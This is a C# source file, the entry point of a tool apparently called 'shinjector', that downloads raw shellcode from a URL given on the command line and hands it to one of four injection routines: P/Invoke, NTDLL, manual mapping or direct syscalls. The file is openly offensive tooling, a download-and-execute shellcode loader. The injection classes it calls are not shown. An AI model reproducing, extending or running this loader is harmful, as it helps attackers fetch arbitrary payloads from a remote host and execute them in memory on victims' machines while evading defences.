using shinjector.Casos;
using System;

namespace shinjector
{
    class Program
    {
        static void Main(string[] args)
        {

            if (args.Length < 2)
            {
                printHelp();
                return;
            }

            string tipo = args[0];
            string url = args[1];

            byte[] sc = new System.Net.WebClient().DownloadData(url);

            switch (tipo)
            {
                case "1":
                    {
                        PInvoke.Inject(sc);
                        break;

                    }
                case "2":
                    {
                        NTDLL.Inject(sc);
                        break;
                    }
                case "3":
                    {
                        Manual_Mapping.Inject(sc);
                        break;
                    }
                case "4":
                    {
                        Syscall.Inject(sc);
                        break;
                    }
                default: break;
                   
            }

            while (true) { }

        }

        private static void printHelp()
        {
            var help = "Usage: shinjector.exe <tipo> <url>";
            Console.WriteLine(help);
        }
    }

}
